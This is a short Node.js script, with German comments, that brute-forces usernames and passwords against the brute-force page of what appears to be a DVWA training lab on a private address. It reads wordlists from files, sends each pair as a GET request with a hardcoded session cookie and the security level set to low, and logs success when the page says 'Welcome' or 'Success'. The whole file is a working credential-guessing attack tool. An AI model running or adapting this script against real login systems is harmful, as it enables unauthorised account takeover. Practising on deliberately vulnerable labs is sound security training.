const fs = require('fs');
const fetch = require('node-fetch');

const URL = 'http://10.115.2.1:4280/vulnerabilities/brute/?username=';
const LOGIN_SUFFIX = '&Login=Login#';

// Ersetze diesen Wert mit deiner tatsächlichen PHPSESSID
const SESSION_ID = 'bbb066ed312aa811b2473b2d1e943fa0';

async function loadFile(filename) {
    return fs.readFileSync(filename, 'utf8').split('\n').map(line => line.trim()).filter(line => line);
}

async function bruteForce() {
    const users = await loadFile('user.txt');
    const passwords = await loadFile('pwd.txt');

    for (const user of users) {
        for (const password of passwords) {
            const url = `${URL}${encodeURIComponent(user)}&password=${encodeURIComponent(password)}${LOGIN_SUFFIX}`;

            try {
                const response = await fetch(url, {
                    method: 'GET',
                    headers: {
                        'User-Agent': 'Mozilla/5.0',
                        'Cookie': `PHPSESSID=${SESSION_ID}; security=low` // Falls DVWA genutzt wird, security auf 'low' setzen
                    }
                });

                const body = await response.text();

                if (body.includes('Welcome') || body.includes('Success')) { // Erfolgskriterium anpassen
                    console.log(`SUCCESS: Username: ${user} | Password: ${password}`);
                    return;
                } else {
                    console.log(`FAILED: Username: ${user} | Password: ${password}`);
                }
            } catch (error) {
                console.error(`ERROR: ${error.message}`);
            }
        }
    }
    console.log('Brute-force attack finished.');
}

bruteForce();
